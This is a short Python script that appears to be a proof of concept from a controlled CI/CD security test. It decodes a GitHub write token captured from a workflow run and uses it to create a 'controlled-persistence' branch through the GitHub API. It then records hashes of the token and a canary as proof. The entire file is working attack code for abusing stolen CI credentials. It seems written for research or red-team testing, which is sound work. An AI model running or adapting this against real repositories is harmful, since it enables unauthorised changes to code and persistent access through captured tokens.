#!/usr/bin/env python3
import base64
import hashlib
import json
import os
import pathlib
import sys
import urllib.error
import urllib.request


proof_path = pathlib.Path("/opt/controlled/proof.json")
if proof_path.exists():
    raise SystemExit(0)

decoded = base64.b64decode(sys.argv[1]).decode("utf-8")
token = decoded.split(":", 1)[1]
run_id = os.environ["GITHUB_RUN_ID"]
repository = os.environ["GITHUB_REPOSITORY"]
branch = f"controlled-persistence-{run_id}"

payload = json.dumps(
    {"ref": f"refs/heads/{branch}", "sha": os.environ["GITHUB_SHA"]}
).encode("utf-8")
request = urllib.request.Request(
    f"https://api.github.com/repos/{repository}/git/refs",
    data=payload,
    method="POST",
    headers={
        "Accept": "application/vnd.github+json",
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "X-GitHub-Api-Version": "2022-11-28",
    },
)

try:
    with urllib.request.urlopen(request, timeout=20) as response:
        api_status = response.status
except urllib.error.HTTPError as error:
    api_status = error.code
    if error.code != 422:
        raise

proof = {
    "api_status": api_status,
    "branch": branch,
    "canary_sha256": hashlib.sha256(
        os.environ["CONTROLLED_MAIN_CANARY"].encode("utf-8")
    ).hexdigest(),
    "event": os.environ["GITHUB_EVENT_NAME"],
    "marker": "checkout-git-wrapper-captured-write-token",
    "repository": repository,
    "run_id": run_id,
    "runner_name": os.environ["RUNNER_NAME"],
    "sha": os.environ["GITHUB_SHA"],
    "token_sha256": hashlib.sha256(token.encode("utf-8")).hexdigest(),
}
proof_path.write_text(json.dumps(proof, indent=2, sort_keys=True) + "\n")
